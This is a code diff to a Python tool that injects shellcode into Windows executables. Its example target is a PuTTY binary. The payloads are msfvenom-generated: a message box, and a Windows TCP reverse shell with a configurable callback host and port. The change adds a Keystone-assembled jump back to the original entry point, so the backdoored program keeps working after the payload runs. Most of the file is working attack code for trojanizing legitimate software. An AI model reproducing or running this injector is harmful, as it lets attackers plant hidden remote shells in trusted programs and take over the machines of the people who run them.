@@ -3,26 +3,46 @@ from config import VERBOSE
 import utilities
 import struct
 import os
+from keystone import *
+import binascii
 
 # TODO currently only works for 32 bit, 64 bit has a different packing
 # scheme and opcodes
 
 
-def call_oep(base, oep):
-    jumpback = base + oep
-    jumpback = struct.pack('I', jumpback)
-    return b'\xB8' + jumpback + b'\xFF\xD0'
+def tohex(val, nbits):
+    return hex((val + (1 << nbits)) % (1 << nbits))
 
 
-def msgbox(oep, base):
+def to_ks(code, syntax=0):
+
+    ks = Ks(KS_ARCH_X86, KS_MODE_32)
+    if syntax != 0:
+        ks.syntax = syntax
+
+    encoding, _ = ks.asm(code)
+    # encoding = [233, 82, 237, 245, 255]
+    encoding = [hex(x)[2:] for x in encoding]
+    packed_command = binascii.unhexlify(''.join(encoding))
+    return packed_command
+
+
+def call_oep(base, oep, nep, displacement):
+
+    loaded_oep = base + oep
+    loaded_nep = base + nep + displacement
+    jumpback = tohex(-loaded_nep + loaded_oep, 32)
+
+    return to_ks(f'jmp {jumpback}')
+
+
+def msgbox(oep, nep, base):
 
     # TODO pe-bear, firefox
     # for this example we are using the message box payload
     # msfvenom -a x86 --platform windows -p windows/messagebox \
     # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
     # EXITFUNC=process TITLE="Testing" -f python
-
-    call = call_oep(base, oep)
 
     messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                        b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
@@ -45,12 +65,18 @@ def msgbox(oep, base):
                        b"\x63\x68\x6e\x20\x79\x6f\x68\x27\x6d\x20\x69\x68\x73"
                        b"\x74\x20\x49\x68\x2c\x20\x54\x65\x68\x54\x65\x73\x74"
                        b"\x31\xc9\x88\x4c\x24\x1e\x89\xe1\x31\xd2\x6a\x40\x53"
-                       b"\x51\x52\xff\xd0" + call)
+                       b"\x51\x52\xff\xd0")
+
+    displacement = len(messagebox)
+
+    jmp = call_oep(base, oep, nep, displacement)
+
+    messagebox += bytes(jmp)
 
     return messagebox
 
 
-def reverse_shell(oep, base, lhost=None, lport=8080):
+def reverse_shell(oep, nep, base, lhost=None, lport=8080):
     # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
     # LHOST=192.168.1.148 LPORT=8080 -f python
 
@@ -59,7 +85,6 @@ def reverse_shell(oep, base, lhost=None, lport=8080):
     ip = utilities.ip_to_hex(lhost)
 
     port = struct.pack('!H', lport)
-    call = call_oep(base, oep)
 
     shellcode = bytes(b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                       b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
@@ -85,15 +110,22 @@ def reverse_shell(oep, base, lhost=None, lport=8080):
                       b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x90\x56\x46\xff\x30"
                       b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                       b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
-                      b"\x75\x05\xbb\x47\x13\x72\x6f" + call)
+                      b"\x75\x05\xbb\x47\x13\x72\x6f")
+
+    displacement = len(shellcode)
+
+    jmp = call_oep(base, oep, nep, displacement)
+
+    shellcode += bytes(jmp)
+
     return shellcode
 
 
-def payload_selection(payload, oep, base, *args, **kwargs):
+def payload_selection(payload, oep, nep, base, *args, **kwargs):
     if payload in 'msgbox':
         if VERBOSE:
             print("Selecting Message Box Shellcode\n")
-        return msgbox(oep, base)
+        return msgbox(oep, nep, base)
     elif payload in 'reverse':
         if VERBOSE:
             print("Selecting Windows TCP Reverse Shell Shellcode")
@@ -102,7 +134,7 @@ def payload_selection(payload, oep, base, *args, **kwargs):
             for a in args:
                 print(f"\tAdditional Argument: {a}")
             print()
-        return reverse_shell(oep, base, *args, **kwargs)
+        return reverse_shell(oep, nep, base, *args, **kwargs)
 
 
 def insert_payload(original_path, payload, *args, **kwargs):
@@ -122,7 +154,7 @@ def insert_payload(original_path, payload, *args, **kwargs):
 
     # Write the shellcode into the new section
     shellcode = payload_selection(
-        payload, oep, pe.OPTIONAL_HEADER.ImageBase, *args, **kwargs)
+        payload, oep, pe.sections[-1].VirtualAddress, pe.OPTIONAL_HEADER.ImageBase, *args, **kwargs)
 
     if VERBOSE:
         print(f"Writing shellcode to {hex(raw_offset)}\n")
@@ -136,4 +168,4 @@ def insert_payload(original_path, payload, *args, **kwargs):
 if __name__ == "__main__":
     p = 'rev'
     path = "./assets/bin/putty_injection.exe"
-    insert_payload(path, p, lport=8888)
+    insert_payload(path, p, lhost='127.0.0.1', lport=8888)
